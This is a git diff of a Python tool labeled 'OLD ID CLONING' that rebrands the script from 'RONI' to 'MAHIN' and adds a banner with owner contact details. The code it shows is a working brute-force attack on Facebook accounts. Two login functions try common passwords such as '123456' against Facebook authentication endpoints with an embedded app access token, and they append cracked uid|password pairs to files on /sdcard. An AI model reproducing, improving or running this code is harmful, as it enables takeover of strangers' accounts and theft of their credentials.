@@ -73,7 +73,7 @@ requests.urllib3.disable_warnings()
  
 # Initial setup and promotion
 os.system('clear')
-print(' \x1b[38;5;46mRONI SERVER LOADING....')
+print(' \x1b[38;5;46mMAHIN SERVER LOADING....')
  
  
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
@@ -192,27 +192,39 @@ def window1():
 # Set window title
 sys.stdout.write('\x1b]2;𓆩【MAHIN】𓆪 \x07')
  
- 
-    # MAHIN Clover Logo - Green - Version 2.5
-def ____banner____():
+# MAHIN Clover Logo - White & Green - Version 2.5
+def __banner__():
     if 'win' in sys.platform:
         os.system('cls')
     else:
         os.system('clear')
-    
-    print("""\033[1;32m
-        
-▗▖  ▗▖ ▗▄▖ ▗▖ ▗▖▗▄▄▄▖▗▖  ▗▖
-▐▛▚▞▜▌▐▌ ▐▌▐▌ ▐▌  █  ▐▛▚▖▐▌
-▐▌  ▐▌▐▛▀▜▌▐▛▀▜▌  █  ▐▌ ▝▜▌
-▐▌  ▐▌▐▌ ▐▌▐▌ ▐▌▗▄█▄▖▐▌  ▐▌
-                           
-                           
-                           
-                                      
-                                      
-                              
-\033[0m""")
+
+    # কালার সেটআপ
+    W = '\033[1;37m' # সাদা
+    G = '\033[1;32m' # সবুজ
+    R = '\033[1;31m' # লাল
+    S = '\033[0m'    # রিসেট
+
+    # ব্যানার ডিজাইন
+    print(f"{W}▗▖  ▗▖ ▗▄▖ ▗▖ ▗▖▗▄▄▄▖▗▖  ▗▖")
+    print(f"{W}▐▛▚▞▜▌▐▌ ▐▌▐▌ ▐▌  █  ▐▛▚▖▐▌")
+    print(f"{G}▐▌  ▐▌▐▛▀▜▌▐▛▀▜▌  █  ▐▌ ▝▜▌")
+    print(f"{G}▐▌  ▐▌▐▌ ▐▌▐▌ ▐▌▗▄█▄▖▐▌  ▐▌")
+
+    print(f"{G}_________________________________________{S}")
+    print(f"{R}♻️ DEVELOPED BY MAHIN ♻️{S}")
+    print(f"{G}_________________________________________{S}")
+
+    print(f"{G}[{W}={G}]    {W}OWNER {G}:{W} MAHIN AHMED👑")
+    print(f"{G}[{W}={G}]    {W}GITHUB {G}:{W} mahin404ahmed✅")
+    print(f"{G}[{W}={G}]     {W}WHATSAPP {G}:{W} 01340038000✌️")
+
+    print(f"{W}_________________________________________")
+
+    print(f"{G}[{W}={G}]     {W}TOOL {G}:{W} OLD ID CLONING☠️")
+    print(f"{G}[{W}={G}]     {W}STATUS {G}:{W} FREE💀")
+    print(f"{G}[{W}={G}]     {W}VERSION {G}:{W} 0.1🔰")
+    print(f"{G}_________________________________________")
  
  
 def creationyear(uid):
@@ -437,7 +449,7 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRONI-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMAHIN-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -482,13 +494,13 @@ def login_1(uid):
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRONI\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/RONI-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mMAHIN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/MAHIN-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRONI\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/RONI-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMAHIN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/MAHIN-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
         loop += 1
@@ -500,7 +512,7 @@ def login_2(uid):
     """
     Login attempt method 2.
     """
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRONI-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMAHIN-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
     
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
         try:
@@ -518,13 +530,13 @@ def login_2(uid):
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRONI\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/RONI-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mMAHIN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/MAHIN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
                 elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRONI\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/RONI-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMAHIN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/MAHIN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
         except Exception as e:
@@ -533,3 +545,4 @@ def login_2(uid):
  
 if __name__ == '__main__':
     BNG_71_()
+ 
